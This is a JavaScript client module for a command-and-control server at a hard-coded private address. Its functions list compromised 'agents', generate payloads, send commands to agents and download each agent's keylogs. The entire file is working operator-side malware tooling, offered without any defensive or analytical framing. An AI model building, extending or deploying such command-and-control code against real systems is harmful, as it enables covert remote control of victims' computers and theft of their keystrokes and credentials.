import axios from 'axios';

export var C2_ENDPOINT = 'http://10.10.10.118:3001';

export var getCallbacks = async () => {

    const request = await axios.get(`${C2_ENDPOINT}/api/agents`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getPayloads = async () => {

    const request = await axios.get(`${C2_ENDPOINT}/api/payloads`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getAgent = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/agent/${id}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var sendCommand = async (id,command) => {

    const request = await axios.post(`${C2_ENDPOINT}/api/agent/${id}`,command, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var genPayload = async (command) => {

    const request = await axios.post(`${C2_ENDPOINT}/api/payload`,command, {headers: {
        'Content-Type': 'application/json'
      }, withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}

export var getKeylog = async (id) => {

    const request = await axios.get(`${C2_ENDPOINT}/api/keylog/${id}`, { withCredentials: true })
        .then(response => response.data);
    console.log(request)
    return {
        payload: request
    }

}